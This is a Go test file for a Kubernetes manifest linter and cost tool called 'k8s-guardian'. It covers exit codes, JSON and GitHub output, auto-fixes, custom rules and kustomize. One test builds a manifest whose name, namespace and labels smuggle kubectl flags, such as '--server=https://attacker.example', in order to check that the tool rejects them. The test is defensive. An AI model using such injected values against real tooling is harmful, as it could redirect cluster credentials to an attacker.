package cli

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func run(t *testing.T, args ...string) (int, string, string) {
	t.Helper()
	var out, errb bytes.Buffer
	app := &App{Name: "k8s-guardian", Version: "test", Stdout: &out, Stderr: &errb}
	code := app.Run(args)
	return code, out.String(), errb.String()
}

const (
	secure   = "../../examples/secure-deployment.yaml"
	insecure = "../../examples/insecure-deployment.yaml"
	costly   = "../../examples/costly-app.yaml"
	orgRules = "../../examples/rules"
)

func copyFile(t *testing.T, src string) string {
	t.Helper()
	data, err := os.ReadFile(src)
	if err != nil {
		t.Fatal(err)
	}
	dst := filepath.Join(t.TempDir(), filepath.Base(src))
	if err := os.WriteFile(dst, data, 0o644); err != nil {
		t.Fatal(err)
	}
	return dst
}

func TestProgramName(t *testing.T) {
	for in, want := range map[string]string{
		"/usr/local/bin/k8s-guardian":  "k8s-guardian",
		"/usr/local/bin/kubectl-guard": "kubectl guard",
		`C:\bin\kubectl-guard.exe`:     "kubectl guard",
	} {
		if runtime.GOOS != "windows" && strings.Contains(in, `\`) {
			continue
		}
		if got := ProgramName(in); got != want {
			t.Errorf("ProgramName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestCheckExitCodes(t *testing.T) {
	if code, out, _ := run(t, "check", "-f", secure); code != ExitOK || !strings.Contains(out, "no issues") {
		t.Errorf("secure: code %d, out %q", code, out)
	}
	code, out, _ := run(t, "-f", insecure) // kubectl-plugin style shorthand
	if code != ExitFindings || !strings.Contains(out, "KG001") {
		t.Errorf("insecure: code %d, out %q", code, out)
	}
	if code, _, _ := run(t, "check", "-f", insecure, "--skip", "KG001,KG002,KG003,KG004,KG010,KG011", "--fail-on", "error"); code != ExitOK {
		t.Errorf("skipping all errors should pass, got %d", code)
	}
	if code, _, errOut := run(t, "check", "-f", insecure, "--ai"); code != ExitError || !strings.Contains(errOut, "--ai requires --fix") {
		t.Errorf("--ai without --fix: code %d, %q", code, errOut)
	}
	if code, _, _ := run(t, "check", "-f", "does-not-exist.yaml"); code != ExitError {
		t.Errorf("missing file should be exit 2, got %d", code)
	}
}

func TestJSONOutput(t *testing.T) {
	_, out, _ := run(t, "check", "-f", insecure, "-o", "json")
	var res struct {
		Findings []map[string]any `json:"findings"`
		Summary  struct{ Errors, Warnings, Fixable int }
	}
	if err := json.Unmarshal([]byte(out), &res); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, out)
	}
	if res.Summary.Errors != 6 || res.Summary.Fixable != 9 || len(res.Findings) != 14 {
		t.Errorf("unexpected summary %+v (%d findings)", res.Summary, len(res.Findings))
	}
}

func TestGitHubFormat(t *testing.T) {
	dir := t.TempDir()
	summary, output := filepath.Join(dir, "summary.md"), filepath.Join(dir, "output")
	t.Setenv("GITHUB_STEP_SUMMARY", summary)
	t.Setenv("GITHUB_OUTPUT", output)
	code, out, _ := run(t, "check", "-f", insecure, "--format", "github")
	if code != ExitFindings {
		t.Errorf("expected exit 1, got %d", code)
	}
	if !strings.Contains(out, "::error file=../../examples/insecure-deployment.yaml,line=19,title=KG001 resource-requests::Deployment/web (container \"nginx\"): missing resources.requests") {
		t.Errorf("missing annotation:\n%s", out)
	}
	s, _ := os.ReadFile(summary)
	if !strings.Contains(string(s), "| ❌ | `KG001` resource-requests |") {
		t.Errorf("unexpected summary:\n%s", s)
	}
	o, _ := os.ReadFile(output)
	if !strings.Contains(string(o), "errors=6\n") || !strings.Contains(string(o), "fixable=9\n") {
		t.Errorf("unexpected outputs:\n%s", o)
	}
}

func TestFixInPlace(t *testing.T) {
	path := copyFile(t, insecure)
	code, _, errOut := run(t, "check", "-f", path, "--fix")
	if code != ExitFindings { // KG010 (:latest) can't be fixed without --ai
		t.Errorf("expected remaining findings, got exit %d", code)
	}
	if !strings.Contains(errOut, "applied 9 fix(es)") {
		t.Errorf("unexpected report:\n%s", errOut)
	}
	fixed, _ := os.ReadFile(path)
	if !strings.Contains(string(fixed), "# TODO pin me") || strings.Contains(string(fixed), "hostNetwork") {
		t.Errorf("unexpected fixed file:\n%s", fixed)
	}
	// Idempotent: a second run changes nothing.
	run(t, "check", "-f", path, "--fix")
	again, _ := os.ReadFile(path)
	if !bytes.Equal(fixed, again) {
		t.Error("second --fix run changed the file")
	}
	// --stdout leaves the file untouched.
	orig := copyFile(t, insecure)
	before, _ := os.ReadFile(orig)
	_, out, _ := run(t, "check", "-f", orig, "--fix", "--stdout")
	after, _ := os.ReadFile(orig)
	if !bytes.Equal(before, after) || !strings.Contains(out, "runAsNonRoot: true") {
		t.Error("--stdout must print the fix and not touch the file")
	}
}

func TestCustomRules(t *testing.T) {
	_, out, _ := run(t, "check", "-f", costly, "--rules", orgRules)
	if !strings.Contains(out, "ORG004") || strings.Contains(out, "ORG001") {
		t.Errorf("unexpected custom findings:\n%s", out)
	}
	if code, out, _ := run(t, "rule", "validate", orgRules); code != ExitOK || !strings.Contains(out, "4 custom rule(s)") {
		t.Errorf("rule validate: %d %q", code, out)
	}
	_, out, _ = run(t, "rules", "--rules", orgRules)
	for _, id := range []string{"KG017", "ORG004", "LV004", "DF001"} {
		if !strings.Contains(out, id) {
			t.Errorf("rules listing misses %s", id)
		}
	}
}

func TestCostJSON(t *testing.T) {
	code, out, _ := run(t, "cost", "-f", costly, "--format", "json", "--cpu-hour", "0.05", "--gib-hour", "0.01")
	if code != ExitOK {
		t.Fatalf("exit %d", code)
	}
	var res struct {
		Workloads []struct {
			Resource    string
			MinReplicas int
			MaxReplicas int
			MonthlyMin  float64
		}
	}
	if err := json.Unmarshal([]byte(out), &res); err != nil {
		t.Fatal(err)
	}
	w := res.Workloads[0]
	// 4 replicas × (4 CPU × 0.05 + 8 GiB × 0.01) × 730 h
	if w.MinReplicas != 4 || w.MaxReplicas != 10 || int(w.MonthlyMin+0.5) != 818 {
		t.Errorf("unexpected estimate %+v", w)
	}
}

// fakeKubectl puts testdata/fakebin (a scripted kubectl) first in PATH.
func fakeKubectl(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake kubectl is a bash script")
	}
	dir, _ := filepath.Abs("testdata/fakebin")
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
}

func TestLiveAndDiffWithFakeCluster(t *testing.T) {
	fakeKubectl(t)
	code, out, _ := run(t, "check", "-f", costly, "--live", "--skip", "KG003,KG005,KG006,KG007,KG008,KG009,KG013,KG014,KG016")
	if code != ExitFindings {
		t.Errorf("expected findings, got %d", code)
	}
	for _, want := range []string{"LV003", "LV004", "only has 9 left", "LV005"} {
		if !strings.Contains(out, want) {
			t.Errorf("--live output misses %q:\n%s", want, out)
		}
	}
	code, out, _ = run(t, "diff", "-f", costly)
	if code != ExitFindings {
		t.Errorf("diff with an immutable selector change must fail, got %d", code)
	}
	for _, want := range []string{"v1.29.4", "DF001", "HorizontalPodAutoscaler/orders-api [shop]  new", "DF006", "DF005"} {
		if !strings.Contains(out, want) {
			t.Errorf("diff output misses %q:\n%s", want, out)
		}
	}
	code, out, _ = run(t, "diff", "-f", secure, "-o", "json")
	var res struct{ Objects []struct{ Status string } }
	if err := json.Unmarshal([]byte(out), &res); err != nil || code != ExitOK || res.Objects[0].Status != "new" {
		t.Errorf("unexpected diff json (%d): %s", code, out)
	}
}

func TestKustomize(t *testing.T) {
	fakeKubectl(t)
	dir := "testdata/kustomize/app"
	code, out, _ := run(t, "check", "-k", dir)
	if code != ExitFindings || !strings.Contains(out, "testdata/kustomize/app (kustomize)  Pod/p") || !strings.Contains(out, "KG010") {
		t.Errorf("-k: code %d\n%s", code, out)
	}
	// -f on a kustomization directory renders it as well, and --fix prints
	// the fixed YAML because rendered output can't be written back.
	_, out, _ = run(t, "check", "-f", dir, "--fix")
	if !strings.Contains(out, "namespace: shop") || !strings.Contains(out, "runAsNonRoot: true") {
		t.Errorf("fixed kustomize output:\n%s", out)
	}
	if code, _, errOut := run(t, "check", "-k", "testdata"); code != ExitError || !strings.Contains(errOut, "no kustomization.yaml") {
		t.Errorf("-k on a plain dir: %d %s", code, errOut)
	}
}

func TestCostUsage(t *testing.T) {
	fakeKubectl(t)
	code, out, errOut := run(t, "cost", "-f", costly, "-f", insecure, "--usage")
	if code != ExitOK {
		t.Fatalf("exit %d: %s", code, errOut)
	}
	// orders-api requests 4 CPU / 8Gi but uses ~15m / 48Mi.
	for _, want := range []string{`"api" uses cpu 15m / memory 48Mi (requests 4 / 8Gi): suggest cpu 30m, memory 80Mi`, "POTENTIAL SAVINGS", "sampled from 2 running pod(s)"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if !strings.Contains(errOut, "Deployment/web: could not read usage: is metrics-server installed?") {
		t.Errorf("expected a metrics note, got %q", errOut)
	}
}

// A manifest from an untrusted pull request must never be able to inject
// kubectl flags (e.g. redirect the credentials with --server).
func TestLiveRejectsKubectlFlagInjection(t *testing.T) {
	fakeKubectl(t)
	log := filepath.Join(t.TempDir(), "calls")
	t.Setenv("FAKE_KUBECTL_LOG", log)
	evil := filepath.Join(t.TempDir(), "evil.yaml")
	os.WriteFile(evil, []byte(`apiVersion: apps/v1
kind: Deployment
metadata:
  name: "--kubeconfig=/tmp/x"
  namespace: "--server=https://attacker.example"
spec:
  selector: {matchLabels: {"--raw": "/api"}}
  template:
    metadata: {labels: {"--raw": "/api"}}
    spec:
      containers: [{name: c, image: "r.io/a:1"}]
`), 0o600)
	_, out, _ := run(t, "check", "-f", evil, "--live")
	run(t, "diff", "-f", evil)
	run(t, "cost", "-f", evil, "--usage")
	calls, _ := os.ReadFile(log)
	for _, bad := range []string{"attacker", "--kubeconfig", "--raw"} {
		if strings.Contains(string(calls), bad) {
			t.Errorf("kubectl received %q:\n%s", bad, calls)
		}
	}
	if !strings.Contains(out, `LV002  invalid namespace "--server=https://attacker.example"`) {
		t.Errorf("expected an invalid-namespace finding:\n%s", out)
	}
	if code, _, errOut := run(t, "audit", "deployments", "-n", "x --server=y"); code != ExitError || !strings.Contains(errOut, "invalid namespace") {
		t.Errorf("audit accepted a malicious namespace: %d %s", code, errOut)
	}
}

// --fix must never drop documents it does not understand.
func TestFixKeepsNonObjectDocuments(t *testing.T) {
	path := filepath.Join(t.TempDir(), "mixed.yaml")
	os.WriteFile(path, []byte("# header\n---\napiVersion: v1\nkind: Pod\nmetadata: {name: p}\nspec:\n  containers: [{name: c, image: nginx}]\n---\n- a list document\n- kept as is\n---\njust a scalar\n"), 0o600)
	run(t, "check", "-f", path, "--fix")
	out, _ := os.ReadFile(path)
	for _, want := range []string{"# header", "runAsNonRoot: true", "- a list document", "- kept as is", "just a scalar"} {
		if !strings.Contains(string(out), want) {
			t.Errorf("missing %q after --fix:\n%s", want, out)
		}
	}
}

// Walking a repository must not fail on unrelated YAML (templates,
// dependencies), but a broken Kubernetes manifest must still fail.
func TestDirectoryWalkIsTolerantButNotBlind(t *testing.T) {
	dir := t.TempDir()
	os.MkdirAll(filepath.Join(dir, "k8s"), 0o755)
	os.MkdirAll(filepath.Join(dir, "node_modules", "x"), 0o755)
	os.MkdirAll(filepath.Join(dir, "templates"), 0o755)
	data, _ := os.ReadFile(secure)
	os.WriteFile(filepath.Join(dir, "k8s", "app.yaml"), data, 0o600)
	os.WriteFile(filepath.Join(dir, "node_modules", "x", "bad.yml"), []byte("key: [unclosed\n"), 0o600)
	os.WriteFile(filepath.Join(dir, "templates", "values.yaml"), []byte("name: {{ app }}\n  bad: [x\n"), 0o600)
	if code, out, errOut := run(t, "check", "-f", dir); code != ExitOK || !strings.Contains(out, "no issues") {
		t.Errorf("unrelated YAML broke the check: %d %s %s", code, out, errOut)
	}
	os.WriteFile(filepath.Join(dir, "k8s", "broken.yaml"), []byte("apiVersion: v1\nkind: Pod\nmetadata: {name: [x\n"), 0o600)
	if code, _, _ := run(t, "check", "-f", dir); code != ExitError {
		t.Errorf("a broken manifest must fail the check, got %d", code)
	}
}
